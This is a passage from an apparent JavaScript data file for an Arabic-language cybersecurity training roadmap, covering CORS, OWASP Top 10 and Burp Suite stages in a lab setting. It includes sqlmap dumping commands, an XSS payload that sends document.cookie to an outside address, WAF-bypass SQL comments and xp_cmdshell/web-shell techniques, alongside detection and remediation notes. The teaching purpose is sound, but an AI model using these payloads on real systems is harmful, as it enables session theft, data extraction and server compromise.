        detection: 'تتصدى خوادم الـ Reverse Proxy (مثل Nginx و HAProxy) لهذه الحيلة بمسح أو إعادة كتابة ترويسة X-Forwarded-For استناداً لعنوان الـ IP الحقيقي المتصل حصراً.',
        link: 'https://portswigger.net/web-security/ip-address-spoofing',
        linkText: 'بحث أكاديمية PortSwigger حول تقنيات انتحال عناوين الـ IP وتجاوز الحماية بالـ Headers'
      },
      {
        title: 'كشف أخطاء تهيئة CORS والسماح بالنطاقات التعسفية (CORS Misconfiguration Exploitation)',
        mitreId: 'T1557',
        category: 'Cross-Origin Attack Vectors',
        explanation: 'عندما يقوم الخادم بإرجاع الترويسة: Access-Control-Allow-Origin: * مصحوبة بـ Access-Control-Allow-Credentials: true، أو يثق في أي قيمة نطاق مرسلة في ترويسة Origin: attacker.com، يمكن للمهاجم كتابة كود جافاسكربت في موقعه يرسل طلبات ذاتية باسم الضحية ويقرأ البيانات الحساسة من استجابة الموقع المستهدف.',
        detection: 'تستخدم ماسحات الثغرات الحديثة أدوات فحص تلقائية لترويسات CORS وتنبيه المطورين لتقييد النطاقات المسموح بها في قائمة بيضاء صارمة.',
        link: 'https://portswigger.net/web-security/cors',
        linkText: 'دليل PortSwigger لفهم واستغلال وتأمين سياسات تبادل الموارد عبر النطاقات (CORS)'
      }
    ],
    checklist: [
      { id: 'c8_1', text: 'فهم أكواد حالات الـ HTTP المختلفة (2xx, 3xx, 4xx, 5xx).' },
      { id: 'c8_2', text: 'معرفة الفرق بين إدارة الجلسات عبر Cookies والـ JWT Tokens.' },
      { id: 'c8_3', text: 'إتقان استخدام أداة Gobuster لتخمين المسارات والملفات السرية.' }
    ],
    officialResources: [
      { name: 'MDN Web Docs: HTTP Protocol Reference', url: 'https://developer.mozilla.org/en-US/docs/Web/HTTP', type: 'Documentation' },
      { name: 'PortSwigger Web Security Academy: Introduction', url: 'https://portswigger.net/web-security', type: 'Labs' }
    ]
  },

  {
    id: 9,
    zoneId: 'zone-web',
    titleAr: 'المرحلة 9: ثغرات الويب الشائعة (OWASP Top 10 Deep Dive)',
    titleEn: 'Stage 9: OWASP Top 10 Deep Dive — Theory, Exploitation & Remediation',
    tag: 'Web Security',
    difficulty: 'متقدم',
    xpReward: 500,
    position: { x: 20, y: 0, z: -15 },
    brief: 'الغوص العميق في أشهر ثغرات تطبيقات الويب طبقاً لتصنيف OWASP العالمي: حقن أوامر قواعد البيانات (SQLi)، البرمجة عبر المواقع (XSS)، التلاعب بالمعرفات المباشرة (IDOR)، حقن الخادم العشوائي (SSRF)، تزوير الطلبات (CSRF)، وتنفيذ الأوامر (RCE).',
    whyLearn: 'قائمة OWASP Top 10 هي المعيار الذهبي المعتمد عالمياً في فحص أمان التطبيقات والامتثال لمعايير PCI-DSS و ISO 27001. إتقان هذه الثغرات يضعك مباشرة في مصاف مختبري الاختراق وصائدي الثغرات (Bug Bounty Hunters).',
    professionalApplication: 'اكتشاف الثغرات في لوحات التحكم والتطبيقات المصرفية والصناعية، إثبات إمكانية استغلالها عبر أدلة عملانية (PoCs)، وتقديم نصائح برمجية دقيقة للمطورين لكيفية ترقيعها وحماية الأنظمة.',
    caseStudy: 'ثغرة Capital One الشهيرة (2019) التي نتجت عن ثغرة SSRF في جدار ناري سحابي خاطئ الإعداد على AWS، مما سمح للمخترق بسرقة بيانات اعتماد الـ IAM واستنزاف بيانات أكثر من 100 مليون عميل.',
    commonMistakes: [
      'الاعتماد على فلاتر كلمات بسيطة (Blacklists) لسد الثغرات بدلاً من استخدام الاستعلامات المجهزة (Parameterized Queries) والترميز السياقي السليم (Contextual Encoding).',
      'الخلط بين أنواع الـ XSS الثلاثة (Stored, Reflected, DOM-based).'
    ],
    detailedGuide: `
### 1. حقن قواعد البيانات (SQL Injection - SQLi)
* **المفهوم:** إدخال كود SQL خبيث في حقول المدخلات دون تنقية، مما يغير المعنى المنطقي للاستعلام الأصلي المنفذ في قاعدة البيانات.
* **أنواعه:**
  * **In-Band (Classic):** تظهر نتائج الاستعلام مباشرة على الشاشة (مثل ثغرات \`UNION-based\`).
  * **Error-Based:** يتعمد استخراج البيانات عبر قراءة رسائل الأخطاء التي يرجعها محرك الـ DB.
  * **Blind SQLi (Boolean & Time-Based):** لا تظهر أي بيانات أو أخطاء، ولكن يتم استنتاج البيانات حرفاً بحرف عبر توجيه أسئلة نعم/لا واستخدام دوال التأخير الزمني (\`pg_sleep(5)\` أو \`WAITFOR DELAY\`).
* **الترقيع:** استخدام Prepared Statements / Parameterized Queries حصراً.

### 2. البرمجة عبر المواقع (Cross-Site Scripting - XSS)
* **المفهوم:** حقن كود جافاسكربت في صفحات الويب ليتم تنفيذه داخل متصفح الضحايا الآخرين، مما يمكن المهاجم من سرقة الكوكيز وجلسات الدخول أو توجيه المستخدم لمواقع تصيد.
* **الأنواع:**
  * **Reflected:** يتم حقن الكود في رابط ويشتغل لحظياً لمن ينقر عليه.
  * **Stored (الأخطر):** يُحفظ الكود الخبيث في قاعدة البيانات (مثل تعليق في منتدى) وينفذ عند كل زائر يفتح الصفحة.
  * **DOM-based:** يحدث التعديل والتنفيذ بالكامل داخل بيئة المتصفح دون الرجوع للخادم.

### 3. التلاعب المباشر بالمعرفات (IDOR / BOLA)
* الخادم يعتمد على المعرف الرقمي المرسل في الطلب (مثل \`GET /api/user/105/profile\`) لعرض بيانات المستخدم دون التحقق مما إذا كان المستخدم المسجل حالياً يملك الحق في رؤية هذا الحساب أم لا!

### 4. حقن الخادم العشوائي (Server-Side Request Forgery - SSRF)
* إجبار سيرفر الويب على إرسال طلبات نيابة عن المهاجم إلى أنظمة داخلية غير مكشوفة للإنترنت، مثل استدعاء خدمات السحابة الداخلية (\`http://169.254.169.254/latest/meta-data/\` على AWS).
    `,
    practicalSteps: [
      {
        step: 1,
        title: 'استغلال واكتشاف ثغرات الـ SQL Injection يدوياً وآلياً عبر SQLmap',
        desc: 'استخدام أداة SQLmap الرائدة لفحص المعاملات واكتشاف قواعد البيانات والجداول تلقائياً.',
        command: 'sqlmap -u "http://10.10.10.50/item.php?id=1" --batch --dbs --level=2 --risk=1',
        flags: [
          { flag: '-u', explanation: 'رابط الصفحة والمعامل المشبوه (?id=1)' },
          { flag: '--batch', explanation: 'الإجابة بنعم تلقائياً على جميع أسئلة الأداة' },
          { flag: '--dbs', explanation: 'استخراج أسماء قواعد البيانات المتاحة على السيرفر' },
          { flag: '--level=2', explanation: 'فحص الترويسات وكوكيز الـ HTTP بجانب المعاملات' }
        ],
        expectedOutput: `[INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[INFO] target URL appears to be UNION injectable with 3 columns
available databases [3]:
[*] information_schema
[*] corporate_db
[*] mysql`,
        proTip: 'بعد استخراج أسماء قواعد البيانات، استخرج جداول قاعدة البيانات الحساسة عبر: sqlmap -u "..." -D corporate_db --tables ثم استخرج بيانات جدول المستخدمين عبر --dump.'
      },
      {
        step: 2,
        title: 'اختبار حمولات XSS وفهم سرقة الكوكيز',
        desc: 'حقن حمولة جافاسكربت بسيطة في حقول المدخلات لاختبار ما إذا كان الخادم يقوم بفلترة وترميز المدخلات السياقي.',
        command: 'echo \'<script>fetch("http://10.10.10.15:8000/?cookie=" + btoa(document.cookie));</script>\'',
        flags: [
          { flag: 'document.cookie', explanation: 'قراءة كوكيز الجلسة الحالية من داخل المتصفح' },
          { flag: 'btoa', explanation: 'تشفير الكوكيز بـ Base64 لضمان نقلها بأمان دون تلف عبر الـ URL' }
        ],
        expectedOutput: `<script>fetch("http://10.10.10.15:8000/?cookie=" + btoa(document.cookie));</script>`,
        proTip: 'طريقة الحماية الوحيدة الفعالة ضد سرقة الكوكيز عبر XSS هي تفعيل خيار HttpOnly في إعدادات الكوكيز، وتطبيق سياسة Content-Security-Policy (CSP) صارمة.'
      }
    ],
    youtubeVideos: [
      {
        title: 'SQL Injection Explained & Exploited (PortSwigger Labs)',
        channel: 'Rana Khalil',
        duration: '28 دقيقة',
        url: 'https://www.youtube.com/watch?v=2e_oZghV528',
        keyTakeaway: 'شرح ممتع وعميق لأنواع SQLi وكيفية استغلالها وترقيعها برمجياً.'
      },
      {
        title: 'Cross-Site Scripting (XSS) - Complete Visual Breakdown',
        channel: 'LiveOverflow',
        duration: '21 دقيقة',
        url: 'https://www.youtube.com/watch?v=L5l9lSnNMww',
        keyTakeaway: 'فهم الفروق بين Reflected و Stored و DOM XSS وكيفية تنفيذ الكود في المتصفح.'
      },
      {
        title: 'Server-Side Request Forgery (SSRF) Explained',
        channel: 'PortSwigger',
        duration: '18 دقيقة',
        url: 'https://www.youtube.com/watch?v=5Vz1yJbH2eE',
        keyTakeaway: 'كيف يستغل المهاجمون خوادم الويب للوصول للسحابة الداخلية وسرقة مفاتيح AWS IAM.'
      }
    ],
    tryHackMeRooms: [
      { name: 'OWASP Top 10 Room', url: 'https://tryhackme.com/r/room/owasptop10', difficulty: 'Easy to Medium', whyMatters: 'غرفة تطبيقية كلاسيكية تجمع لابات مباشرة لكل ثغرة من ثغرات OWASP العشرة.' },
      { name: 'SQL Injection Lab', url: 'https://tryhackme.com/r/room/sqlinjectionlm', difficulty: 'Medium', whyMatters: 'تمارين عملية على استخراج البيانات يدوياً وآلياً عبر SQLi.' },
      { name: 'Cross-Site Scripting (XSS)', url: 'https://tryhackme.com/r/room/xss', difficulty: 'Medium', whyMatters: 'شرح وتطبيق أنواع الـ XSS وتجاوز الفلاتر البدائية.' }
    ],
    writeup: {
      title: 'استغلال وترقيع ثغرات حقن قواعد البيانات المتقدمة SQLi (OWASP Top 10 Web Exploitation)',
      scenario: 'اختبار اختراق تطبيقي على بوابة دفع إلكتروني: اكتشاف ثغرة SQL Injection عمياء (Time-Based Blind SQLi) في معامل بحث، استخراج مخطط قاعدة البيانات تلقائياً عبر SQLmap، وإثبات الثغرة بتقرير أمني شامل، ثم كتابة كود الترقيع الآمن باستخدام Prepared Statements.',
      steps: [
        {
          phase: 'Phase 01: Parameter Fuzzing & SQL Syntax Error Induction',
          title: 'فحص المعاملات وإحداث أخطاء في استعلامات SQL',
          action: 'تم إرسال رموز كسر الاستعلامات الكلاسيكية (\' OR 1=1-- و \'") في معامل ?search= على بوابة الدفع، ولاحظنا اختفاء بعض نتائج البحث وتغير زمن استجابة الخادم مما يشير لوجود ثغرة حقن SQL غير مباشرة.',
          detection: 'تسجل أنظمة كشف التسلل (WAF Rules مثل ModSecurity CRS Rule 942100) محاولات حقن عبارات SQL المشبوهة في معلمات الـ GET/POST وتصنفها كـ High Anomaly Score.',
          mitreId: 'T1190',
          link: 'https://owasp.org/www-community/attacks/SQL_Injection',
          linkText: 'دليل مجتمع OWASP الشامل لثغرات حقن قواعد البيانات (SQL Injection)'
        },
        {
          phase: 'Phase 02: Boolean & Time-Based Blind Exploitation via SQLmap',
          title: 'الاستغلال المتقدم عبر دوال التأخير الزمني الآلية',
          action: 'باستخدام أمر: sqlmap -u "http://10.10.10.50/search.php?id=1" --technique=T --dbms=MySQL --batch، قامت الأداة بحقن دوال SLEEP(5) وحساب التأخير الزمني لاستنتاج كل بايت في قاعدة البيانات حرفاً بحرف.',
          detection: 'ترصد سجلات قواعد البيانات (MySQL Slow Query Log) استعلامات تستغرق وقتاً طويلاً مصحوبة بدوال التأخير SLEEP() أو BENCHMARK().',
          mitreId: 'T1190',
          link: 'https://sqlmap.org/',
          linkText: 'الموقع الرسمي لأداة SQLmap الرائدة في الكشف التلقائي عن ثغرات الـ SQLi'
        },
        {
          phase: 'Phase 03: Database Schema & Sensitive Data Enumeration',
          title: 'استخراج مخطط قاعدة البيانات وبيانات المستخدمين المشفرة',
          action: 'تم استخراج أسماء الجداول (users, transactions, api_keys) وسحب جدول المستخدمين الذي يحتوي على هاشات كلمات المرور من نوع bcrypt، وتوثيق الثغرة كدليل اختراق حاسم (Critical PoC).',
          detection: 'تسجل أنظمة مراقبة قواعد البيانات (Database Activity Monitoring - DAM) قراءة مكثفة لجداول النظام مثل information_schema.tables من مستخدم تطبيق الويب.',
          mitreId: 'T1005',
          link: 'https://portswigger.net/web-security/sql-injection',
          linkText: 'معامل أكاديمية PortSwigger لجميع أنواع استغلال واستخراج بيانات SQL Injection'
        },
        {
          phase: 'Phase 04: Vulnerability Remediation via Parameterized Queries',
          title: 'ترقيع الثغرة نهائياً باستخدام الاستعلامات المجهزة الآمنة',
          action: 'إعادة كتابة كود PHP بالاعتماد على PDO و Prepared Statements: $stmt = $pdo->prepare("SELECT * FROM items WHERE id = :id"); $stmt->execute([\'id\' => $id]);، مما يحول أي مدخل إلى مجرد قيمة حرفية دون إمكانية تعديل هيكل الاستعلام.',
          detection: 'يتم فحص الكود المحدث عبر أدوات SAST للتأكد من خلوه تماماً من أي دمج مباشر للمتغيرات (String Concatenation) داخل جمل الاستعلام.',
          mitreId: 'T1190',
          link: 'https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html',
          linkText: 'دليل OWASP المرجعي الصارم للوقاية والترقيع النهائي لثغرات SQL Injection'
        }
      ],
      lessonLearned: 'منع ثغرات الـ SQL Injection بنسبة 100% لا يتم عبر فلاتر التصفية أو Blacklisting، بل بالاعتماد الحصري على الاستعلامات المجهزة (Parameterized Queries / Prepared Statements) واستخدام Object Relational Mapping (ORM) مؤمن مع مبدأ Least Privilege لقاعدة البيانات.'
    },
    secretTradecraft: [
      {
        title: 'تجاوز جدران حماية تطبيقات الويب بتعليقات SQL المتقدمة (WAF Bypass via Inline Comments)',
        mitreId: 'T1562.001',
        category: 'Web Application Defense Evasion',
        explanation: 'تقوم قواعد الـ WAF بفحص الكلمات المفتاحية مثل UNION SELECT. يقوم المهاجمون بتجاوز هذه القواعد عبر حقن تعليقات MySQL المخصصة مثل /*!50000UNION*//*!50000SELECT*/ أو استخدام الترميز المزدوج (Double URL Encoding: %2527)، حيث يتجاهل الـ WAF الطلب بينما يفكه خادم الويب ومحرك قاعدة البيانات وينفذه بنجاح.',
        detection: 'تتصدى أنظمة WAF الحديثة عبر تطبيق تقنيات فك الترميز المتكرر (Recursive Decoding) وتطبيع المدخلات قبل مطابقتها مع قواعد الحظر.',
        link: 'https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/sql-injection/waf-bypass',
        linkText: 'دليل HackTricks الشامل لتقنيات تجاوز الـ WAF في هجمات حقن SQL'
      },
      {
        title: 'استغلال ثغرات حقن قواعد البيانات من الدرجة الثانية (Second-Order SQL Injection)',
        mitreId: 'T1190',
        category: 'Complex Web Vulnerabilities',
        explanation: 'في هذه الثغرة، يقوم المهاجم بإدخال الكود الخبيث في صفحة يتم حفظ مدخلاتها بأمان في قاعدة البيانات (مثل تسجيل اسم مستخدم: admin\'--). يكمن الخطر عندما تقوم وظيفة أخرى لاحقة (مثل صفحة تغيير كلمة المرور) باستدعاء هذا الاسم المخرن ودمجه في استعلام جديد بدون حماية، مما يؤدي لتنفيذ الحقن في مكان بعيد تماماً عن نقطة الإدخال الأولى.',
        detection: 'يتم رصد هذه الثغرات عبر أدوات التحليل الديناميكي التفاعلي (IAST) التي تتبع مسار تدفق البيانات (Data Flow Taint Analysis) من نقطة التخزين حتى نقطة الاستخدام.',
        link: 'https://portswigger.net/web-security/sql-injection/blind',
        linkText: 'شرح PortSwigger لثغرات الـ Blind والـ Second-Order SQL Injection'
      },
      {
        title: 'تحويل ثغرات حقن SQL إلى تنفيذ أوامر نظام (SQLi to RCE via xp_cmdshell / INTO OUTFILE)',
        mitreId: 'T1059',
        category: 'Privilege Escalation & Code Execution',
        explanation: 'إذا كانت قاعدة بيانات Microsoft SQL Server تعمل بصلاحيات sa، يمكن للمهاجم استغلال SQLi لتفعيل ميزة: EXEC sp_configure \'xp_cmdshell\', 1; RECONFIGURE; ثم تنفيذ أوامر نظام التشغيل مباشرة عبر: EXEC xp_cmdshell \'whoami\'. وفي MySQL، إذا توفرت صلاحية FILE، يمكن كتابة Web Shell في مجلد الويب عبر INTO OUTFILE.',
        detection: 'ترصد أنظمة EDR على خوادم قواعد البيانات تشغيل sqlservr.exe أو mysqld.exe لعمليات فرعية مثل cmd.exe أو powershell.exe وتطلق تنبيهاً فورياً.',
        link: 'https://attack.mitre.org/techniques/T1059/',
        linkText: 'توثيق تقنيات تنفيذ الأوامر من خلال محركات قواعد البيانات في MITRE ATT&CK'
      }
    ],
    checklist: [
      { id: 'c9_1', text: 'فهم ميكانيكية استغلال وترقيع ثغرات SQLi بأنواعها (Union, Error, Blind).' },
      { id: 'c9_2', text: 'التمييز بين أنواع XSS الثلاثة (Stored, Reflected, DOM) وطرق الحماية.' },
      { id: 'c9_3', text: 'استيعاب ثغرات الـ IDOR والـ SSRF ومخاطرها في البيئات السحابية.' }
    ],
    officialResources: [
      { name: 'OWASP Top 10 Official Documentation', url: 'https://owasp.org/www-project-top-ten/', type: 'Documentation' },
      { name: 'PortSwigger Web Security Academy (Best Free Hands-on Resource)', url: 'https://portswigger.net/web-security', type: 'Labs' },
      { name: 'PayloadsAllTheThings (Comprehensive Web Payloads Cheatsheet)', url: 'https://github.com/swisskyrepo/PayloadsAllTheThings', type: 'Cheatsheet' }
    ]
  },

  {
    id: 10,
    zoneId: 'zone-web',
    titleAr: 'المرحلة 10: احتراف أداة بيرب سويت (Burp Suite Professional Mastery)',
    titleEn: 'Stage 10: Burp Suite Mastery — Proxy, Repeater, Intruder & Extensions',
    tag: 'Web Security',
    difficulty: 'متقدم',
    xpReward: 450,
    position: { x: 30, y: 0, z: -15 },
    brief: 'الأداة رقم 1 عالمياً في اختبار اختراق تطبيقات الويب: ضبط الـ Proxy واعتراض الحزم (Intercept)، تثبيت شهادة الـ CA لفحص HTTPS، التلاعب بالطلبات عبر Repeater، الهجمات التكرارية والتخمين عبر Intruder، وإضافات BApp Store.',
    whyLearn: 'لا يوجد مختبر اختراق ويب على وجه الأرض لا يفتح Burp Suite كأول خطوة في عمله اليومي. هي المنظار الجراحي الذي يعترض كل بايت يخرج من المتصفح، مما يتيح لك تعديل الأسعار، تغيير المعرفات، وحقن الحمولات الخبيثة لحظياً.',
    professionalApplication: 'فحص التطبيقات المصرفية، اختبار الـ APIs، تجاوز حماية شاشات تسجيل الدخول، وأتمتة البحث عن الثغرات عبر إضافات متطورة مثل Autorize و Turbo Intruder.',
    caseStudy: 'اكتشاف ثغرة تلاعب بالأسعار في متجر إلكتروني عملاق؛ حيث قام مختبر الاختراق باعتراض طلب الدفع في Burp Suite وتغيير حقل amount: 5000 إلى amount: 1، وقبل الخادم الطلب بسبب عدم إعادة التحقق من السعر في الـ Backend!',
    commonMistakes: [
      'نسيان تثبيت شهادة Burp CA في المتصفح، مما يظهر أخطاء أمان HTTPS مستمرة ويمنع تصفح المواقع.',
      'تشغيل هجمات Intruder العنيفة على بيئة إنتاجية حقيقية، مما يؤدي لحظر الحساب أو التسبب في تعطيل الخدمة.'
    ],
    detailedGuide: `
### 1. الأقسام الرئيسية في Burp Suite
* **Proxy (البروكسي):** يقف بين متصفحك وسيرفر الويب. يقوم باعتراض كل طلب (Intercept On) ويتيح لك تعديله قبل إرساله.
* **Repeater (المكرر):** يتيح لك إعادة إرسال نفس الطلب عشرات المرات مع تعديل معاملات معينة في كل مرة ومراقبة استجابة الخادم فوراً (الأداة الأهم لاكتشاف SQLi و IDOR يدوي).
* **Intruder (المهاجم الآلي):** أداة أتمتة لإرسال آلاف الطلبات وتخمين المعاملات وكلمات السر:
  * **Sniper:** يستخدم حمولة واحدة في نقطة واحدة بالترتيب.
  * **Battering Ram:** يضع نفس الكلمة في كل النقاط المحددة معاً.
  * **Pitchfork:** يدمج قائمتين مختلفتين بالتوازي (مثل قائمة أسماء وقائمة كلمات سر متطابقة).
  * **Cluster Bomb:** يجرب كل تباديل وتوافيق القوائم (Brute Force شامل).
* **Target & Site Map:** شجرة تعرض كل الملفات والمسارات التي تم اكتشافها أثناء التصفح.

### 2. أهم الإضافات المجانية في متجر BApp Store
1. **Autorize:** أداة خارقة لاكتشاف ثغرات الـ IDOR وضعف الصلاحيات تلقائياً أثناء تصفحك بحسابين مختلفين.
2. **Turbo Intruder:** أداة بايثون فائقة السرعة قادرة على إرسال عشرات آلاف الطلبات بالثانية لاختبار ثغرات الـ Race Conditions.
3. **Hackvertor:** أداة تشفير وفك تشفير سريعة لتجاوز الفلاتر بالترميز (URL, Base64, Hex, HTML Entities).
    `,
    practicalSteps: [
      {
        step: 1,
        title: 'تثبيت شهادة Burp CA في متصفح فايرفوكس لفك تشفير HTTPS',
        desc: 'الخطوة الأساسية الأولى لاعتراض حركة مرور المواقع المشفرة بـ HTTPS دون أي تحذيرات أمان.',
        command: 'echo "1. اضبط بروكسي المتصفح على 127.0.0.1:8080 -> 2. افتح الرابط: http://burpsuite -> 3. اضغط CA Certificate -> 4. في إعدادات فايرفوكس: ابحث عن Certificates -> استورد الملف وفعل Trust this CA to identify websites."',
        flags: [
          { flag: '127.0.0.1:8080', explanation: 'المنفذ الافتراضي الذي يستمع عليه بروكسي Burp Suite' },
          { flag: 'cacert.der', explanation: 'ملف الشهادة الرقمية لجعل المتصفح يثق في اعترافات الترافيك' }
        ],
        expectedOutput: `Certificate imported successfully into Firefox Authority Store. HTTPS traffic decryption active.`,
        proTip: 'يمكنك أيضاً استخدام المتصفح المدمج داخل Burp (Open Browser) بنقرة واحدة، حيث يأتي مع الشهادة مسبقة التثبيت دون الحاجة لأي ضبط يدوي!'
      },
      {
        step: 2,
        title: 'استخدام Burp Repeater لتعديل المعاملات واكتشاف ثغرات الـ IDOR',
        desc: 'إرسال طلب تسجيل أو عرض ملف شخصي وتعديل معرف المستخدم لمراقبة استجابة الخادم.',
        command: 'echo "في Burp: حدد الطلب -> اضغط Ctrl+R (Send to Repeater) -> غير GET /api/user/101 إلى GET /api/user/1 -> اضغط Send وشاهد البيانات في الـ Response"',
        flags: [
          { flag: 'Ctrl + R', explanation: 'اختصار إرسال الطلب المعترض إلى Repeater' },
          { flag: 'IDOR Testing', explanation: 'تغيير المعرف الرقمي 101 إلى 1 للتحقق من صلاحية الوصول لحساب المدير' }
        ],
        expectedOutput: `HTTP/1.1 200 OK
Content-Type: application/json
{
  "user_id": 1,
  "username": "admin",
  "email": "admin@enterprise.lab",
  "role": "SuperAdministrator"
}`,
        proTip: 'إذا أرجع الخادم بيانات المدير بكود 200 OK وأنت مسجل كمستخدم عادي 101، فهذه ثغرة IDOR عالية الخطورة (High Severity) توثق فوراً في تقريرك!'
      }
    ],
    youtubeVideos: [
      {
        title: 'Getting Started with Burp Suite Proxy and Repeater',
        channel: 'PortSwigger',
        duration: '16 دقيقة',
        url: 'https://www.youtube.com/watch?v=5Vz1yJbH2eE',
        keyTakeaway: 'الدليل الرسمي السريع لإعداد البروكسي واستخدام Repeater لاعتراض الترافيك.'
      },
      {
        title: 'Burp Suite Intruder - How to Brute Force & Fuzz Parameters',
        channel: 'The Cyber Mentor',
        duration: '25 دقيقة',
        url: 'https://www.youtube.com/watch?v=3Kq1MIfTWCE',
        keyTakeaway: 'شرح هجمات Intruder الأربعة وتخصيص قوائم الكلمات لاكتشاف الثغرات وتخمين الحسابات.'
      }
    ],
    tryHackMeRooms: [
      { name: 'Burp Suite: The Basics', url: 'https://tryhackme.com/r/room/burpsuitebasics', difficulty: 'Easy', whyMatters: 'شرح شامل لواجهة وإعدادات وعملية اعتراض الترافيك في بيرب سويت.' },
      { name: 'Burp Suite: Repeater', url: 'https://tryhackme.com/r/room/burpsuiterepeater', difficulty: 'Easy', whyMatters: 'إتقان استخدام Repeater لتحليل الثغرات يدوياً.' },
      { name: 'Burp Suite: Intruder', url: 'https://tryhackme.com/r/room/burpsuiteintruder', difficulty: 'Medium', whyMatters: 'شرح أنواع هجمات Intruder الأربعة وتخصيص نقاط التخمين.' }
    ],
    writeup: {
      title: 'استغلال وتعديل طلبات الويب المتقدمة عبر Burp Suite Repeater & Intruder',
      scenario: 'تدقيق أمني على بوابة تداول أسهم: اعتراض حركة المرور عبر Burp Proxy، إرسال طلب الشراء إلى Repeater واكتشاف ثغرة Race Condition عبر إرسال مئات الطلبات المتزامنة (Parallel Requests) لشراء نفس الأصل عدة مرات قبل تحديث الرصيد، ثم استخدام Intruder لتخمين كوبونات الخصم السرية.',
      steps: [
        {
          phase: 'Phase 01: Burp Proxy TLS Interception & Target Scope Filtering',
          title: 'اعتراض حركة الـ HTTPS وعزل نطاق الهدف بدقة',
          action: 'تم تثبيت شهادة PortSwigger CA في المتصفح، وضبط خاصية Target Scope على نطاق *.target-corp.com فقط، وتفعيل خيار Drop Out-of-Scope Requests لفلترة الترافيك ومنع تسجيل طلبات النطاقات الخارجية غير المعنية بالاختبار.',
          detection: 'تسجل أنظمة إدارة أجهزة المستخدمين (MDM) تثبيت شهادات جذرية مخصصة (Custom Root CA) وتطلق تنبيهاً أمنياً إذا تم تثبيتها على أجهزة غير مصرحة لأعمال الاختبار الأمني.',
          mitreId: 'T1071.001',
          link: 'https://portswigger.net/burp/documentation/desktop/tools/proxy',
          linkText: 'التوثيق الرسمي لضبط واستخدام Burp Suite Proxy والشهادات الأمنية'
        },
        {
          phase: 'Phase 02: Repeater Deep Dive & Single-Packet Attack',
          title: 'تحليل الاستجابات وتنفيذ هجوم التسابق بحزمة HTTP/2 واحدة',
          action: 'باستخدام Burp Repeater، تم وضع 20 طلباً في مجموعة واحدة (Group Tab) وإرسالها متزامنة عبر ميزة Send group in parallel (HTTP/2 Single-Packet Attack) لاستغلال ثغرة تسابق (Race Condition) في رصيد المحفظة قبل خصم المبلغ.',
          detection: 'ترصد أنظمة كشف الاحتيال المصرفي (Fraud Detection Systems) إتمام عمليات سحب مالي متعددة بنفس الـ Timestamp بالميلي ثانية وتجمد الحساب مؤقتاً.',
          mitreId: 'T1499',
          link: 'https://portswigger.net/research/smashing-the-state-machine',
          linkText: 'بحث James Kettle المرجعي في PortSwigger حول هجمات الـ Race Conditions'
        },
        {
          phase: 'Phase 03: Intruder Pitchfork Attack for Coupon Fuzzing',
          title: 'التخمين الآلي للمعاملات باستخدام نمط Pitchfork',
          action: 'تم تحديد نقطتي استبدال: رقم المعامل ورقم الكوبون، وضبط نمط الهجوم على Pitchfork لتجربة قائمة كوبونات ترويجية بالتوازي مع معرفات حسابات الاختبار لاكتشاف كوبونات لم يتم إلغاء تفعيلها.',
          detection: 'ترصد جدران حماية الويب (WAF) الارتفاع المفاجئ في عدد طلبات POST القادمة من مصدر واحد وتفرض قيود الـ Rate Limiting بحظر عنوان الـ IP المؤقت (HTTP 429 Too Many Requests).',
          mitreId: 'T1110.001',
          link: 'https://portswigger.net/burp/documentation/desktop/tools/intruder',
          linkText: 'دليل استخدام Burp Intruder وتخصيص أنماط الهجوم والقواميس'
        },
        {
          phase: 'Phase 04: Session Hardening & Database Locking Remediation',
          title: 'ترقيع الثغرة وفرض أقفال قواعد البيانات ومفاتيح الـ Idempotency',
          action: 'تطبيق قفل الصفوف الصارم (Database Row-Level Locking: SELECT ... FOR UPDATE) وفرض مفاتيح عدم التكرار (Idempotency Keys) في ترويسات الطلبات لمنع معالجة نفس العملية مرتين مهما بلغ تزامن الطلبات.',
          detection: 'يتم فحص زمن استجابة قاعدة البيانات ومراقبة أحداث الـ Deadlock المحتملة للتحقق من استقرار الأداء بعد تطبيق أقفال التزامن.',
          mitreId: 'T1190',
          link: 'https://cheatsheetseries.owasp.org/cheatsheets/Transaction_Locking_Cheat_Sheet.html',
          linkText: 'دليل OWASP الشامل لإدارة أقفال المعاملات ومنع ثغرات Race Conditions'
        }
      ],
      lessonLearned: 'الاعتماد على الترتيب الزمني الافتراضي في تنفيذ المعاملات المالية يفتح الباب لثغرات الـ Race Conditions والتلاعب بالقيم. يجب تفعيل الـ Database Row-Level Locking وحظر تكرار معالجة نفس الرمز برمجياً (Idempotency Keys).'
    },
    secretTradecraft: [
      {
        title: 'هجمات حزمة الـ HTTP/2 الواحدة لتفجير الـ Race Conditions (HTTP/2 Single-Packet Attack)',
        mitreId: 'T1499',
        category: 'Advanced Web Exploitation',
        explanation: 'في اتصالات HTTP/1.1 القديمة، تتأخر كل حزمة بضعة أجزاء من الألف من الثانية بسبب زمن الشبكة (Jitter)، مما يقلل فرص نجاح هجوم الـ Race Condition. بفضل بروتوكول HTTP/2، يمكن دمج إرسال عشرات الطلبات غير المكتملة في إطار TCP واحد ثم إرسال آخر بايت (End of Stream) لجميع الطلبات دفعة واحدة في حزمة واحدة، مما يضمن وصولها للخادم في نفس النانو ثانية وتفجير الثغرة باحتمالية 100%.',
        detection: 'تتصدى خوادم الويب الحديثة عبر معالجة الإطارات في طوابير معزولة ومراقبة تدفق طلبات الـ Streams السريعة على اتصال HTTP/2 واحد.',
        link: 'https://portswigger.net/web-security/race-conditions',
        linkText: 'معامل وشروحات أكاديمية PortSwigger لهجمات الـ Race Conditions عبر HTTP/2'
      },
      {
        title: 'أتمتة تدقيق صلاحيات المستخدمين الصامت عبر إضافة Autorize (Automated Auth Matrix Auditing)',
        mitreId: 'T1068',
        category: 'AppSec & IDOR Automation',
        explanation: 'إضافة Autorize الشهيرة في متجر BApp Store تعترض كل طلب تتصفحه بحساب المدير العام (Admin)، وتعيد إرساله تلقائياً مرتين في الخلفية: مرة بكوكيز مستخدم عادي (Low Privilege) ومرة بدون كوكيز نهائياً (Unauthenticated)، ثم تلون الرد بالأخضر أو الأحمر لتخبرك فوراً بوجود ثغرة IDOR أو تخطي صلاحيات دون أن تضطر لفحص كل مسار يدوياً.',
        detection: 'ترصد فرق الـ Blue Team وجود جلسات متوازية من متصفح واحد تستخدم رموز وصول لحسابات متعددة بمعدل زمني متطابق.',
        link: 'https://github.com/Quitten/Autorize',
        linkText: 'مستودع إضافة Autorize الرسمية لأتمتة كشف ثغرات الصلاحيات والـ IDOR'
      },
      {
